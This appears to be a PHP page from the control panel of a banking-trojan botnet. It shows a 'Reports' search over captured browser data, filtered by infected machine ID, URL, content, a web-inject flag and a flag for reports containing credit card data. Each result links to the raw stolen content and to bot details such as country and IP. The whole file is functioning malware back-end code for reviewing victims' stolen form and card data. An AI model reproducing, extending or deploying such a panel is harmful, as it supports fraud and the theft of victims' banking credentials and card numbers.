<?php
require_once('inc/common.php');
$db = db();

if(isset($_GET['view_content']))
{
   header('X-Content-Type-Options: nosniff'); //stop chrome from downloading the file
   header('Content-Type: text/plain');
   $query = $db->prepare('SELECT content FROM reports WHERE id = ?');
   $query->bindValue(1, $_GET['view_content'], PDO::PARAM_INT);
   $query->execute();
   echo $query->fetchColumn();
   exit();
}

ui_start('Reports');
ui_content_start();
?>
<div class="box">
  <div class="title">Search</div>
  <form method="GET">
    <table class="form">
      <tr>
        <td>Date</td>
        <td>
<?php
   $query = $db->prepare('SELECT received FROM reports ORDER BY received DESC LIMIT 1');
   $query->execute();
   $new_received = (int) $query->fetchColumn();

   $query = $db->prepare('SELECT received FROM reports ORDER BY received ASC LIMIT 1');
   $query->execute();
   $old_received = (int) $query->fetchColumn();

   function day_min($time)
   {
      return strtotime(date('Y-m-d 00:00:00', $time));
   }

   function day_max($time)
   {
      return strtotime(date('Y-m-d 23:59:59', $time));
   }
   $new_received_min = day_min($new_received);
   $old_received_min = day_min($old_received);
?>
           <select name="date_min" class="input" style="width: 160px;">
<?php
   for($i = $new_received_min; $i >= $old_received_min; $i -= 86400)
   {
      echo '<option value="'.day_min($i).'">'.date('d/m/Y', $i).'</option>';
   }
?>
           </select>
to
           <select name="date_max" class="input" style="width: 160px;">
<?php
   for($i = $new_received_min; $i >= $old_received_min; $i -= 86400)
   {
      echo '<option value="'.day_max($i).'">'.date('d/m/Y', $i).'</option>';
   }
?>
           </select>
        </td>
      </tr>
      <tr>
        <td>URL</td>
        <td><input type="text" name="url" class="input"></td>
      </tr>
      <tr>
        <td>Content</td>
        <td><input type="text" name="content" class="input"></td>
      </tr>
      <tr>
        <td>UHIDs</td>
        <td><input type="text" name="uhids" class="input"></td>
      </tr>
      <tr>
        <td>WebInject</td>
        <td><input type="checkbox" name="inject"></td>
      </tr>
      <tr>
        <td>Contains CC</td>
        <td><input type="checkbox" name="card"></td>
      </tr>
      <tr>
        <td></td>
        <td style="text-align: right; color: #333;">
          <input style="float: left;" type="submit" class="btn" value="Submit">
          Order By
        <select class="input" name="order" style="width: 80px;">
            <option value="0">Received</option>
          </select>
          <select class="input" name="dir" style="width: 100px;">
            <option value="0">Descending</option>
            <option value="1">Ascending</option>
          </select>
        </td>
      </tr>
    </table>
  </form> 
</div>
<?php
if(isset($_GET['order']))
{
   if($_GET['date_min'] > $_GET['date_max'])
      echo('<div class="error margin-top">First date can\'t be later then the second one</div>');
   else
   {
      $sqlWhere = '';
      if($_GET['uhids'] != '')
      {
         $uhids = explode(' ', $_GET['uhids']);
         $sqlWhere .= ' AND uhid IN ('.gen_qmarks($uhids).')';
      }
      if($_GET['url'] != '')
         $sqlWhere .= ' AND url LIKE ?';
      if($_GET['content'] != '')
         $sqlWhere .= ' AND content LIKE ?';
      if(isset($_GET['inject']))
         $sqlWhere .= ' AND inject = 1';
      if(isset($_GET['card']))
         $sqlWhere .= ' AND foundCard = 1';

      $sqlWhere .= ' AND (received >= ? AND received <= ?)';

      function bind_values()
      {
         global $query, $uhids, $i;
         if($_GET['uhids'] != '')
         {
            foreach($uhids as $uhid)
               $query->bindValue(++$i, $uhid, PDO::PARAM_STR);
         }
         if($_GET['url'] != '')
            $query->bindValue(++$i, $_GET['url'], PDO::PARAM_STR);
         if($_GET['content'] != '')
            $query->bindValue(++$i, $_GET['content'], PDO::PARAM_STR);

         $query->bindValue(++$i, $_GET['date_min'], PDO::PARAM_INT);
         $query->bindValue(++$i, $_GET['date_max'], PDO::PARAM_INT);
      }

      $query = $db->prepare('SELECT COUNT(*) FROM reports WHERE 1 = 1'.$sqlWhere);
      $i = 0;
      bind_values();
      $query->execute();
      $total = $query->fetchColumn();
      if($total == 0)
         echo('<div class="error margin-top">No reports found</div>');
      else
      {
         get_pag_vars($total, $pages, $page, $offset);
         $query = $db->prepare('SELECT * FROM reports WHERE 1 = 1'.$sqlWhere.' 
                                ORDER BY received '.($_GET['dir'] == 1 ? 'ASC' : 'DESC').' LIMIT ? OFFSET ?');
         $i = 0;
         bind_values();
         $query->bindValue(++$i, $CONST_PAGE_LIMIT, PDO::PARAM_INT);
         $query->bindValue(++$i, $offset, PDO::PARAM_INT);
         $query->execute();
?>
<div class="box margin-top">
  <div>Reports</div>
  <table class="table" style="width: 100%;">
    <tr>
      <th>URL</th>
      <th>Browser</th>
      <th>UHID</th>
      <th>Received</th>
    </tr>
<?php
         $rows = $query->fetchAll();
         foreach($rows as $row)
         {
            $url = htmlspecialchars(substr($row['url'], 0, 70));
            if(strlen($url) < strlen($row['url']))
               $url = '<label title="'.htmlspecialchars($row['url']).'">'.$url.'...</label>';
            echo('<tr>
                    <td>'.$url.'</td>
                    <td>'.htmlspecialchars($row['software']).'</td>
                    <td>'.htmlspecialchars($row['uhid']).'</td>
                    <td><label title="'.format_time($row['received']).'">'.time_since($row['received']).'</label></td>
                    <td class="action" style="text-align: center;" nowrap>
                      <a target="_blank" class="btn" href="?view_content='.$row['id'].'" style="margin-right: 5px;">
                        View Content
                      </a>
                      <a target="_blank" class="btn" 
                      href="bots.php?order=0&dir=0&countries=&uhids='.htmlspecialchars($row['uhid']).'&ips=">
                        Bot Info
                      </a>   
                    </td>
                  </tr>');
         }
?>
  </table>
<?php
         echo_pag_form($page, $pages);
?>
</div>
<?php
      }
   }
}
ui_content_end();
ui_end();
?>